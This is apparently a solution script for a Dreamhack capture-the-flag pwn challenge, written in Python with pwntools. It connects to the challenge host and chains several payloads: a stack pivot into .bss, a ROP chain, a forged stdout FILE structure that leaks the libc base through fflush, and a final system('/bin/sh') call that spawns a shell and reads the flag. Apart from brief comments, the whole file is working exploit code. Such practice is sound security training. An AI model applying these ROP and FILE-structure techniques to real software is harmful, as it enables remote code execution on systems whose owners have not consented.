#!/usr/bin/env python3
from pwn import *
import binascii
import sys

exe_path = './validator_revenge_patched'
HOST = 'host8.dreamhack.games'
PORT = 15860

exe = ELF(exe_path, checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe
context.terminal = [
    'cmd.exe', '/c', 'start',
    'wt.exe', '-w', '0', 'split-pane', '-V',
    '-d', '.',
    'wsl.exe',
    '-d', 'kali-linux',
    'bash', '-c'
]

gdbscript = '''
b*0x4007d6
continue
'''

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    p = process(exe.path)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
        input()
    return p

p = start()

def sla(prompt, data):
    p.sendlineafter(prompt, data)
def sa(prompt, data):
    p.sendafter(prompt, data)
def s(prompt):
    p.send(prompt)
def sl(data):
    p.sendline(data)

# ============================EXPLOIT============================
# ROP GADGETS
add_rsp = 0x000000000040053a # add rsp, 8 ; ret
jmp_ptr_rbp = 0x00000000004009fb # jmp qword ptr [rbp]
leave_ret = 0x000000000040079b
ret = 0x000000000040053e
mov_gadget = 0x0000000000400691 # mov rbp, rsp ; pop rdx ; ret 
pop_rbp = 0x000000000040068d
pop_rdi = 0x0000000000400873
pop_rdx = 0x0000000000400694
pop_rsi = 0x000000000040068b
pop_rsp = 0x000000000040086d # pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret

read_main = 0x4007c5
fflush_main = 0x4007ec
read_plt = exe.plt['read']
fflush_plt = exe.plt['fflush']

text = b'DREAMHACK!'
for i in range(126, 8, -1):
    text += p8(i)

# stack pivot to .bss
payload1 = text + p64(0x601a00) + p64(read_main)
s(payload1)
log.info('payload1 sent')
pause()

# when fflush call _IO_file_sync (fflush+154)
# it will push rbp (_IO_file_jumps) and rbx (_IO_2_1_stdout_)
# so if we set rsp at bss, we can leak stdout addr
# now stdout is at 0x6019d8, we can leak it by changing FILE structure 
stdout = 0x6019d8
payload2 = text + p64(0x601a08) + p64(fflush_main)
payload2 += flat(
    # read ROP to pop rsi before 0x6019d8 (stdout) so that it will take stdout ptr as buf addr
    pop_rdi, 0x0,
    pop_rsi, stdout - 0x20,
    pop_rdx, 0x20,
    read_plt,

    # read ROP to leak stdout via fflush
    pop_rdi, 0x0,
    pop_rsi, stdout + 0x8,  
    pop_rdx, 0x200,
    read_plt,

    # jmp to begin of ROP
    pop_rsp, stdout - 0x20
)
s(payload2)
log.info('payload2 sent')
pause()

# set pop rsi before stdout to overwrite FILE structure
payload3 = flat(
    0, 0, 0,
    pop_rsi
)
s(payload3)
pause()

# fake FILE structure to leak libc base
flags = 0xFBAD1808
IO_read_ptr = 0x0
IO_read_end = 0x601020
IO_read_base = 0x0
IO_write_base = 0x601020
IO_write_ptr = 0x601020 + 0x8
IO_write_end = 0x0
IO_buf_base = 0x0
IO_buf_end = 0x8

fake_FILE_structure = flat(
    flags,
    IO_read_ptr,
    IO_read_end,
    IO_read_base,
    IO_write_base,
    IO_write_ptr,
    IO_write_end,
    IO_buf_base,
    IO_buf_end
)

# overwrite FILE structure
payload4 = flat(
    # read fake FILE structure to stdout
    pop_rdi, 0,
    pop_rdx, 0x48,
    read_plt,

    # reset rbp
    pop_rbp, 0x601a18,

    # call fflush to leak libc
    fflush_main,

    # read ROP system("/bin/sh")
    pop_rdi, 0,
    pop_rsi, 0x601c00,
    pop_rdx, 0x20,
    read_plt,
    pop_rbp, 0x601bf8,
    leave_ret

)
s(payload4)
log.info('payload4 sent')   
s(fake_FILE_structure)

# leak libc base
libc_leak = u64(p.recv(8))
libc.address = libc_leak - libc.symbols['_IO_2_1_stdout_']
log.success(f'libc base: {hex(libc.address)}')

sys = libc.symbols['system']
binsh = next(libc.search(b'/bin/sh\x00'))

# ROP
payload5 = flat(
    pop_rdi, binsh,
    sys
)
s(payload5)
log.info('payload5 sent')

# flag
sl(b'cat flag*')
p.interactive()
